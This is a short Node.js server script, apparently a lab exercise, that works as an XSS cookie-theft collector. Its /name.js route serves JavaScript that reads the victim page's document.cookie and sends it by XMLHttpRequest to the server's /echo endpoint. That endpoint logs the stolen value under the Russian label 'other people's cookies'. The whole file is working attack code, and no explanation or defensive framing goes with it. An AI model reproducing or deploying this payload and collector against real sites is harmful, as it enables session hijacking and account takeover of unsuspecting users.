var http = require('http');
var url = require('url');
var server = new http.Server(function(req, res){
	var urlParsed = url.parse(req.url, true);
	if(urlParsed.pathname == '/echo' && urlParsed.query.message){
		console.log('чужие cookie: ' + urlParsed.query.message);
		res.end()
	}
	if(urlParsed.pathname == '/name.js'){
		console.log('connect new user')
		let js = `
		var x = new XMLHttpRequest();
		x.open("GET", "http://localhost:5050/echo?message="+document.cookie, true);
		x.send(null);
		`
		res.end(js)
	}
});
server.listen(5050, '127.0.0.1');